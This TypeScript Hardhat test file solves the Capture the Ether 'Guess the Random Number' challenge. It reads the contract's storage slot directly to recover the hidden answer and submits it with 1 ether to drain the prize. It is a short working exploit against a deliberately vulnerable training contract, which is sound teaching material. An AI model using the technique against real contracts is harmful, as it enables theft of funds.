import { ethers } from "hardhat";
import { BigNumber, Contract, Signer } from "ethers";
import { expect } from "chai";

let accounts: Signer[];
let eoa: Signer;
let contract: Contract; // challenge contract

before(async () => {
    accounts = await ethers.getSigners();
    eoa = accounts[0];
    const factory = await ethers.getContractFactory("GuessTheRandomNumberChallenge");

    const network = await (await ethers.provider.getNetwork()).name
    if (network === "ropsten") {
        contract = factory.attach(`0xB5c4F6844b667584345c8b18c3E3e3d4e05A9Fe2`);
    } else {
        contract = await factory.deploy({
            value: ethers.utils.parseEther("1"),
        });
    }
});

it("solves the challenge", async function () {
    const answer = parseInt(await contract.provider.getStorageAt(contract.address, 0))

    const tx = await contract.guess(answer, {
        value: ethers.utils.parseEther("1"),
    });

    const txHash = tx && tx.hash
    expect(txHash).to.not.be.undefined

    const isComplete = await contract.isComplete()
    expect(isComplete).to.be.true;
});